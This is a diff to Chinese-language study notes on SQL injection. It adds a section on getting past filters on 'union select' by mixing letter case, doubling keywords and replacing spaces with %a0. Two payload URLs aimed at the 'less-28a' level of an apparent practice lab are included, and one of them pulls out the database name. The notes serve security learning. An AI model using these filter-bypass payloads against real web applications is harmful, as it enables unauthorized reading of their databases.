@@ -345,6 +345,26 @@ union select * from (select 1)a join (select 2)b join (select 3)c
 
 注：逗号被过滤，查询数据时不可以使用常用语句group_concat(username,password) 要分开查询
 
+# union select过滤绕过
+
+大小写绕过
+
+unIon seLect
+
+双写绕过
+
+uniunionon selselectect
+
+大小写+不使用空格
+
+示例：
+
+less-28a
+
+?id=1')%a0unIon%a0seLect(1),(2),(3)||('1')=('1
+
+?id=1000')%a0unIon%a0seLect(1),(database()),(3)||('1')=('1
+
 ## 宽字节注入
 
 addslashes()函数，在指定的预定义字符（'，"，\，NUL）前添加反斜杠\，使字符失去原本的作用
